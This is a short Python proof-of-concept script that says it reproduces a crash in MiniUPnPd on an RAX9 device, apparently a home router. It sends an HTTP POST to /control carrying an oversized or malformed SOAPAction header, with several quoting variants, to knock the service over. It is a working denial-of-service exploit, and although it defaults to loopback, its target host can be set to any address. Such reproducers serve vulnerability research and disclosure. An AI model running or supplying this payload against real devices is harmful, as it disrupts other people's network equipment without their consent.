#!/usr/bin/env python3
"""Minimal loopback-only RAX9 MiniUPnPd SOAPAction crash reproducer."""

from __future__ import annotations

import argparse
import hashlib
import socket


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=56688)
    parser.add_argument("--length", type=int, default=4096)
    parser.add_argument("--body-length", type=int, default=13)
    parser.add_argument(
        "--form",
        choices=(
            "balanced",
            "unquoted",
            "missing-close",
            "single-quote",
            "unquoted-valid",
            "missing-close-valid",
        ),
        default="balanced",
    )
    args = parser.parse_args()

    action = "FRIDAY_RAX9_SOAPACTION_DOS_" + "A" * args.length
    if args.form == "balanced":
        header_value = f'"{action}"'
    elif args.form == "unquoted":
        header_value = action
    elif args.form == "missing-close":
        header_value = f'"{action}'
    elif args.form == "single-quote":
        header_value = "'"
    elif args.form == "unquoted-valid":
        header_value = (
            "urn:schemas-upnp-org:service:WANIPConnection:1#"
            "GetExternalIPAddress"
        )
    else:
        header_value = (
            '"urn:schemas-upnp-org:service:WANIPConnection:1#'
            "GetExternalIPAddress"
        )

    body = b"A" * args.body_length
    request = (
        f"POST /control HTTP/1.1\r\n"
        f"Host: {args.host}:{args.port}\r\n"
        f"SOAPAction: {header_value}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    ).encode() + body

    with socket.create_connection((args.host, args.port), timeout=2.0) as sock:
        sock.sendall(request)
        sock.settimeout(1.0)
        try:
            response = sock.recv(1024)
        except (ConnectionResetError, socket.timeout):
            response = b""

    print(
        f"form={args.form} sent={len(request)} "
        f"request_sha256={hashlib.sha256(request).hexdigest()} "
        f"soapaction_payload={len(header_value)} response={response!r}"
    )


if __name__ == "__main__":
    main()
